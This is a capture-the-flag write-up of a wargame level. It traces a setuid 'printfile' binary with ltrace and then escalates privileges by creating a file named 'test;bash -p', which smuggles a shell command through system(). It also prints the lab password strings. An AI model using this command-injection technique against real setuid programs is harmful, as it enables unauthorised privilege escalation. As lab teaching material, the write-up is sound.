**`leviathan2@gibson:~$ ls`**  
*`printfile`*  

Another setuid binary. 

**`leviathan2@gibson:~$ ./printfile`**  
```
*** File Printer ***
Usage: ./printfile filename
```
**`leviathan2@gibson:~$ ls -la`**  
```
total 36
drwxr-xr-x  2 root       root        4096 Dec  3 08:13 .
drwxr-xr-x 83 root       root        4096 Dec  3 08:14 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Dec  3 08:13 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```
**`leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3`**   
*`You cant have that file...`*  

Well that's odd; it won't let us print the contents of the leviathan3 password file, despite the binary having ownership permissions of `leviathan3`. Let's see what's going on under the hood:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                                        = -1
puts("You cant have that file..."You cant have that file...
)                                                                                                                 = 27
+++ exited (status 1) +++
```

So it's using the `access()` function to determine whether I have read permissions for the referenced file. Since this returned a -1 in the `ltrace`, this fails, and then resorts to `puts()` to print that I don't have access. Let's try running this again with another file, one that we should definitely have read-access to:

**`leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2`**  
```
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                                                                                                        = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                                              = 39
geteuid()                                                                                                                                          = 12002
geteuid()                                                                                                                                          = 12002
setreuid(12002, 12002)                                                                                                                             = 0
system("/bin/cat /etc/leviathan_pass/lev"...mEh5PNl10e
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
+++ exited (status 0) +++
```

Here we go. There are several things going on here:
* The `access()` function checks whether we have read permissions to the file referenced in our setuid binary execution argument
* A string is built, using `snprintf()`, concatenating `/bin/cat` with the filename in question
* The `setreuid()` function sets both the real and effective UID to leviathan3
* The `system()` function calls the concatenated string built earlier and executes

As stated above, any "filename" (that we have read permissions for) that is passed to the concatenated string will be executed by `system()`, AFTER `setreuid()` sets the real/effective UID to leviathan3. We can therefore fool the `system()` function into accepting a filename with a command appended to it, since there doesn't seem to be any proper input validation in place:

**`leviathan2@gibson:~$ mkdir /tmp/rajh`**  
**`leviathan2@gibson:~$ touch "/tmp/rajh/test;bash -p"`**  
**`leviathan2@gibson:~$ ./printfile "/tmp/rajh/test;bash -p"`**  
*`/bin/cat: /tmp/rajh/test: No such file or directory`*  
*`leviathan3@gibson:~$`*  

So rather than `./printfile` interpreting my referenced file as one file, it interpreted it as a file AND a command; it first executed `/bin/cat /tmp/rajh/test` (which didn't exist), and then executed `bash -p`, which spawned a shell as leviathan3.

**`leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3`**  
*`Q0G8j4sakn`*  
